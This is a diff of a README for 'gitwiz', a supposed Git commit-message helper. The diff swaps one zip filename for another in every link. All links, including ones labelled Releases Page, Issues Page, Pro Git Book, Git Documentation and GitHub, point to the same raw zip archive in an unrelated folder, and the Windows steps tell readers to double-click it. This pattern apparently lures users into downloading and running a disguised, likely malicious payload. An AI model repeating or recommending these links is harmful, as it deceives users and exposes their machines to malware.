@@ -1,6 +1,6 @@
 # 🧙 gitwiz - Craft Better Commit Messages with Ease
 
-[![Download gitwiz](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip)](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip)
+[![Download gitwiz](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip)](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -14,17 +14,17 @@ Welcome to **gitwiz!** This interactive tool helps you create better Git commit 
 
 ## 📥 Download & Install
 
-To get started with **gitwiz**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip).
+To get started with **gitwiz**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip).
 
 1. Click on the latest version available on the Releases page.
-2. Look for an executable file suitable for your operating system (e.g., `https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip` for Windows, `gitwiz` for macOS/Linux).
+2. Look for an executable file suitable for your operating system (e.g., `https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip` for Windows, `gitwiz` for macOS/Linux).
 3. Download the file.
 
 Once downloaded, follow these steps to run the application:
 
 ### Windows
 
-1. Locate the `https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip` file in your Downloads folder.
+1. Locate the `https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip` file in your Downloads folder.
 2. Double-click it to launch the application.
 
 ### macOS/Linux
@@ -62,20 +62,20 @@ This project covers various topics, helping you improve your Git experience:
 
 ## 🛠 Contribution
 
-We welcome users to contribute! You can report issues or suggest features here: [Issues Page](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip). 
+We welcome users to contribute! You can report issues or suggest features here: [Issues Page](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip). 
 
 ## 📚 Resources
 
 For more information about how to use Git effectively, you may find these resources helpful:
 
-- [Pro Git Book](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip) - A comprehensive guide to Git.
-- [Git Documentation](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip) - Official documentation for Git commands.
+- [Pro Git Book](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip) - A comprehensive guide to Git.
+- [Git Documentation](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip) - Official documentation for Git commands.
 
 ## 📞 Support
 
 If you have any questions or need help with gitwiz, feel free to reach out:
 
-- Open an issue on [GitHub](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip).
+- Open an issue on [GitHub](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip).
 - Check FAQs in the repository.
 
-Remember to visit this page to download: [Releases Page](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software_v2.6.zip) and enhance your Git experience with **gitwiz**!
+Remember to visit this page to download: [Releases Page](https://raw.githubusercontent.com/arunkisa7/gitwiz/main/glucolysis/Software-2.1.zip) and enhance your Git experience with **gitwiz**!
